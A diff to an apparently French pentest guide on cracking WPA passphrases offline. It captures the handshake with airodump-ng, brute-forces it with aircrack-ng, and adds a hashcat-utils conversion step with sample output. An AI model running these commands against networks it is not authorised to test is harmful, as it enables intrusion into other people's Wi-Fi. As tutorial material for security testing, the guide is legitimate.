@@ -349,7 +349,7 @@ L'authentification commence par les probe request / response, messages d'authent
 Il est possible d'effectuer des attaques par brute force en mode offline pour retrouver la passphrase. Il faut pour cela récupérer l'handshake entre un client et l'AP. Pour cela on peut utiliser airodump-ng:
 
 ``` bash
-airodump-ng --bssid D0:84:B0:00:C2:B0 wlan0mon --channel 1 --write apture
+airodump-ng --bssid D0:84:B0:00:C2:B0 wlan0mon --channel 1 --write capture
 ```
 
 On peut arrêter la capture dès qu'on a une indication de la capture de l'handshake:
@@ -371,6 +371,19 @@ Il est alors possible de lancer une attaque par bruteforce avec aircrack-ng. Il 
 
 ``` bash
 aircrack-ng output-01.cap -w wordlist
+```
+On peut aussi utiliser hashcat. Il faut pour cela utiliser hashcat-utils pour convertir au bon format:
+
+``` bash
+[~] /opt/hashcat-utils/src/cap2hccapx.bin # A installer à partir de https://github.com/hashcat/hashcat-utils                              
+usage: /opt/hashcat-utils/src/cap2hccapx.bin input.pcap output.hccapx [filter by essid] [additional network essid:bssid]
+[~] /opt/hashcat-utils/src/cap2hccapx.bin capture-01.cap capture.hccapx                                                                                                                                    
+Networks detected: 1
+
+[*] BSSID=cc:66:aa:22:55:44 ESSID=XXX (Length: 3)
+ --> STA=ff:ff:ff:ff:ff:ff, Message Pair=2, Replay Counter=0
+
+Written 16 WPA Handshakes to: capture.hccapx
 ```
 
 (**A revoir**)Il est ensuite de déchiffrer les données avec airdecap-ng:
